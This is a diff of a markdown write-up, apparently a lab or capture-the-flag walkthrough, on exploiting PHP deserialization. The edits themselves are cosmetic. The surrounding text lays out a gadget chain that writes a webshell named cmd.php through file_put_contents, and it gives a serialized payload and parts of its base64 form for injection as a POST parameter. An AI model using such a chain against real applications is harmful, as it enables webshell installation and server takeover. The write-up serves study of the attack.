@@ -119,7 +119,7 @@ Let's illustrate this in the following picture:
 We can see that the `Song` class is the one that initiates the entire class calling sequence to our desired `file_put_contents` function.
 
 <br />
-To summarize what we’ve covered so far:
+<ins>To summarize what we’ve covered so far:</ins>
   1. We need to exploit the `file_put_contents` functionality to write a webshell.
   2. We need to initialize the `$filename` variable under the LogWriter_File class with a value of `cmd.php`.
   3. We need to insert our malicious PHP code as a content to the `cmd.php` file triggered by the `writeLog` function.
@@ -133,7 +133,6 @@ Let's put all the pieces together to create the payload as a one big serialized 
 
 `O:6:"Lyrics":2:{s:9:"*lyrics";s:12:"shell_lyrics";s:7:"*song";O:4:"Song":4:{s:9:"*logger";O:6:"Logger":1:{s:12:"*logwriter";O:14:"LogWriter_File":2:{s:11:"*filename";s:7:"cmd.php";s:9:"*format";O:13:"LogFileFormat":2:{s:10:"*filters";a:1:{i:0;O:12:"OutputFilter":2:{s:15:"*matchPattern";s:19:"/\[i\](.*)\[\/i\]/i";s:14:"*replacement";s:9:"\1";}}s:7:"*endl";s:1:" ";}}}s:7:"*name";s:35:"";s:8:"*group";s:11:"shell_group";s:6:"*url";s:19:"https:\/\/shell.com";}}`
 
-<br />
 The final serialized payload to be injected as a HTTP POST parameter in base64 format wil follow:
 
 `Tzo2OiJMeXJpY3MiOjI6e3M6OToiACoAbHlyaWNzIjtzOjEyOiJzaGVsbF9seXJpY3MiO3M6`
@@ -157,7 +156,7 @@ The final serialized payload to be injected as a HTTP POST parameter in base64 f
 `czo2OiIAKgB1cmwiO3M6MTk6Imh0dHBzOlwvXC9zaGVsbC5jb20iO319`
 
 
-We can use the Online PHP Unserializer[^2] to visualize the encoded payload in a Class Object format:
+We can use the Online PHP Unserializer[^2] to visualize the encoded payload in a Class Object hierarchy:
 <br />
 
 <p align="center">
